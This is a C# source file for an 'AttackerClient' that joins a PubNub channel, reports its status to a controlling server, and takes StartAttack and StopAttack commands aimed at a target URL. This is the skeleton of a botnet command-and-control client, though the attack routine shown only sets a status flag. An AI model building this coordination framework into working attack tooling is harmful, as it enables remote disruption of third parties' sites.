using AtackerDTO;
using AttackerCommon;
using ChannelController;
using PubnubApi;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Timers;

namespace AttackerClient
{
    class Program
    {
        static string SenderId;
        static ClientStatusType Status;
        static string Data;
        static Pubnub pubnub;

        static void Main(string[] args)
        {
            SenderId = Identity.CreateNewID();
            Status = ClientStatusType.Normal;
            Data = String.Empty;
            pubnub = ChannelHelper.InitializePubNubClient();

            //Client'ın bilgileri server ile paylaşılıyor
            PublishStatusMessage();

            //Mesajların alınması için listener yaratılıyor
            Listener listener = new Listener(pubnub);
            listener.AddListener(message =>
            {
                HandleMessage(message);
                return true;
            });

            Console.ReadLine();
        }

        private static void PublishStatusMessage()
        {
            Publisher publisher = new Publisher(pubnub);

            MessageType messageType;

            switch (Status)
            {
                case ClientStatusType.Normal:
                    messageType = MessageType.ClientStatus;
                    break;
                case ClientStatusType.Message:
                    messageType = MessageType.TextToServers;
                    break;
                case ClientStatusType.Error:
                    messageType = MessageType.ClientError;
                    break;
                case ClientStatusType.Attacking:
                    messageType = MessageType.ClientAttacking;
                    break;
                default:
                    messageType = MessageType.ClientStatus;
                    break;
            }

            WriteMessage($"messageType: {messageType.ToString()} Publishing");

            publisher.PublishMessage(new MessageDTO(messageType, SenderId, Data), (isError, errorMessage) =>
            {
                if (!isError)
                {
                    WriteMessage($"messageType: {messageType.ToString()} Published");
                }
                else
                {
                    WriteMessage($"messageType: {messageType.ToString()} Error!: " + errorMessage);
                }

                return !isError;
            });
        }

        private static void HandleMessage(MessageDTO message)
        {
            /*
             Eğer client tarafından karşılanan bir mesaj ise bu değer true yapılır
             */
            bool isHandled = false;

            switch (message.MessageType)
            {
                case MessageType.RefreshClients:
                    PublishStatusMessage();
                    isHandled = true;
                    break;
                case MessageType.TextToClients:
                    WriteMessage(message.Data);
                    isHandled = true;
                    break;
                case MessageType.StartAttack:
                    StartAttack(message.Data);
                    isHandled = true;
                    break;
                case MessageType.StopAttack:
                    StopAttack();
                    isHandled = true;
                    break;
                default:
                    break;
            }

            //Eğer mesaj handle edildiyse son durum server ile paylaşılıyor
            if (isHandled)
            {
                PublishStatusMessage();
            }
        }

        /// <summary>
        /// Saldırıyı başlatır
        /// </summary>
        /// <param name="url"></param>
        private static void StartAttack(string url)
        {
            Status = ClientStatusType.Attacking;
            Data = url;
            WriteMessage("Attacking started to " + url);
        }

        /// <summary>
        /// Client'ın bilgisini server'a gönderir
        /// </summary>
        /// <param name="url"></param>
        private static void RefreshClient()
        {
            WriteMessage("Refreshing client.");
            PublishStatusMessage();
        }

        /// <summary>
        /// Saldırıyı durdurur
        /// </summary>
        /// <param name="url"></param>
        private static void StopAttack()
        {
            Status = ClientStatusType.Normal;
            Data = String.Empty;
            WriteMessage("Attacking stopped");
        }

        /// <summary>
        /// Ekrana mesajı yazar
        /// </summary>
        /// <param name="message"></param>
        private static void WriteMessage(string message)
        {
            Console.WriteLine(message);
        }
    }
}
